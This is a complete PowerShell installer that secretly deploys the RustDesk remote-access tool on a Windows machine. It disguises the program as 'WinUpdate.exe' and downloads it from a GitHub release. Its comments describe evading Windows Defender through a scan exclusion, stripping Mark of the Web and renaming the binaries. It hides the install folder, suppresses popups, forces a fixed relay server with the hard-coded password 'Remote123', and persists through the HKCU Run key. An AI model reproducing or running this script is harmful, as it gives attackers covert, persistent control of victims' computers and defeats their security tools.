function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"

    # KEY CHANGE 1: Don't rename to svchost.exe - that's the #1 Defender trigger
    # Use a neutral name that won't be flagged
    $EXE    = "$DEST\WinUpdate.exe"
    $DLL    = "$DEST\sciter.dll"
    $HIDER  = "$DEST\WinUpdateHelper.exe"
    $cfgDir = "$env:APPDATA\RustDesk\config"
    $base   = "https://github.com/kk70226581/rd-files/releases/download/v1.0"

    Write-Host "Installing..." -ForegroundColor Cyan

    # KEY CHANGE 2: Try Defender exclusion but don't depend on it
    try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}

    # Kill old instances + clean
    Get-Process WinUpdate,WinUpdateHelper -EA SilentlyContinue |
        Where-Object { $_.Path -like "*WinSystem*" } |
        Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST   -Force | Out-Null
    New-Item -ItemType Directory $cfgDir -Force | Out-Null

    # KEY CHANGE 3: Download with Unblock-File to remove Mark of the Web flag
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("$base/chrome.exe", $EXE)
    $wc.DownloadFile("$base/sciter.dll", $DLL)
    $wc.DownloadFile("$base/hider.exe",  $HIDER)

    # Remove MOTW (Mark of the Web) - this is what makes Defender scan downloads
    Unblock-File $EXE   -EA SilentlyContinue
    Unblock-File $DLL   -EA SilentlyContinue
    Unblock-File $HIDER -EA SilentlyContinue

    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
        Write-Host "Download failed!" -ForegroundColor Red; return
    }

    # Write config
    @"
rendezvous_server = '34.107.221.82'
relay_server = '34.107.221.82'
nat_type = 1
serial = 0
[options]
verification-method = 'use-permanent-password'
approve-mode = 'password'
direct-server = 'N'
force-always-relay = 'Y'
"@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8

    @"
enc_id = ''
password = 'Remote123'
salt = ''
key_confirmed = true
"@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8

    # Hide the folder
    try {
        $f = Get-Item $DEST -Force
        $f.Attributes = $f.Attributes -bor 2 -bor 4
    } catch {}

    # Start popup killer FIRST
    $psiH = New-Object System.Diagnostics.ProcessStartInfo
    $psiH.FileName = $HIDER; $psiH.WorkingDirectory = $DEST
    $psiH.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psiH.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psiH) | Out-Null

    # Start RustDesk hidden
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $EXE; $psi.WorkingDirectory = $DEST
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep 5

    # Get ID
    $psiId = New-Object System.Diagnostics.ProcessStartInfo
    $psiId.FileName = $EXE; $psiId.Arguments = "--get-id"
    $psiId.UseShellExecute = $false
    $psiId.RedirectStandardOutput = $true
    $psiId.CreateNoWindow = $true
    $psiId.WorkingDirectory = $DEST
    $prId = [System.Diagnostics.Process]::Start($psiId)
    $outT = $prId.StandardOutput.ReadToEndAsync()
    $prId.WaitForExit(8000) | Out-Null
    $RDID = $outT.Result.Trim()

    # KEY CHANGE 4: Auto-start via Registry (HKCU) instead of Scheduled Task
    # HKCU\Run works WITHOUT admin - no UAC needed at all
    $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty $regPath "WinSystemUpdate"       "$EXE"    -Force
    Set-ItemProperty $regPath "WinSystemUpdateHelper" "$HIDER"  -Force

    # Delete script
    $deletePs = "$DEST\delete.ps1"
    @'
$d = "$env:LOCALAPPDATA\WinSystemUpdate"
Get-Process WinUpdate,WinUpdateHelper -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
$regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Remove-ItemProperty $regPath "WinSystemUpdate"       -EA SilentlyContinue
Remove-ItemProperty $regPath "WinSystemUpdateHelper" -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
foreach ($dp in @([Environment]::GetFolderPath("Desktop"), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
    Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue
}
'@ | Set-Content $deletePs -Encoding UTF8

    # Desktop shortcut
    $lnkPath = $null
    foreach ($dp in @([Environment]::GetFolderPath('Desktop'), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
        if (Test-Path $dp) { $lnkPath = "$dp\DELETE CHROME.lnk"; break }
    }
    if ($lnkPath) {
        $sh = (New-Object -COM WScript.Shell).CreateShortcut($lnkPath)
        $sh.TargetPath   = "powershell.exe"
        $sh.Arguments    = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
        $sh.IconLocation = "shell32.dll,131"
        $sh.Save()
    }

    # 1-hour auto-delete
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"Start-Sleep 3600; & '$deletePs'`""

    # Done
    Write-Host ""
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host "   Your ID:  $RDID" -ForegroundColor Cyan
    Write-Host "   Password: Remote123" -ForegroundColor Cyan
    Write-Host "   Popup:    BLOCKED" -ForegroundColor Cyan
    Write-Host "   Auto-starts on boot: YES (no admin needed)" -ForegroundColor Gray
    Write-Host "   Desktop shortcut: DELETE CHROME (to uninstall)" -ForegroundColor Gray
    Write-Host "   Auto-deletes in 1 hour." -ForegroundColor Gray
    Write-Host "  ==========================================" -ForegroundColor Green
}
Install-RD
